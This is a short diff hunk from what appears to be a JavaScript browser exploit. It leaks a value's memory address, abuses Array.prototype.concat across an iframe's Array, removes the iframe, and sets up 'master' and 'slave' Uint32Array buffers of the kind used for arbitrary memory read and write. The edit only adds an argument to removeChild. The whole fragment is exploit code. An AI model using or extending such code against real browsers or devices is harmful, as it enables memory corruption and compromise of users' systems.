@@ -303,7 +303,7 @@ var b = new f.contentWindow.Array(u2d(leakJSVal.low + 0x10, leakJSVal.hi), 13.37
     tgt.d = 0x1337;
 
 var c = Array.prototype.concat.call(a, b);
-document.body.removeChild(f);
+document.body.removeChild(f, d);
  
 var master = new Uint32Array(0x1000);
 var slave = new Uint32Array(0x1000);
